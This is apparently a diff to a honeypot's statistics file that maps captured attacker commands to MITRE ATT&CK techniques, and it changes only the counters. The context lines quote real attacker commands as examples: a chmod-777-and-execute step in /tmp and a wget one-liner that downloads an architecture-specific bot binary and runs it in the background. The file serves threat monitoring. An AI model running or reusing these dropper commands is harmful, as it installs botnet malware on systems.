@@ -25,7 +25,7 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 6957,
+      "count": 6958,
       "distinct_ips": 422,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -59,7 +59,7 @@
         "discovery"
       ],
       "url": "https://attack.mitre.org/techniques/T1082",
-      "count": 344,
+      "count": 345,
       "distinct_ips": 38,
       "examples": [
         "m=$(uname -m); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; esac; wget http://:7332/bot.$m -O /tmp/.z && chmod +x /tmp/.z && /tmp/.z ''  &",
@@ -183,6 +183,6 @@
       ]
     }
   ],
-  "total_commands": 330053,
-  "matched_commands": 131978
+  "total_commands": 330074,
+  "matched_commands": 131979
 }
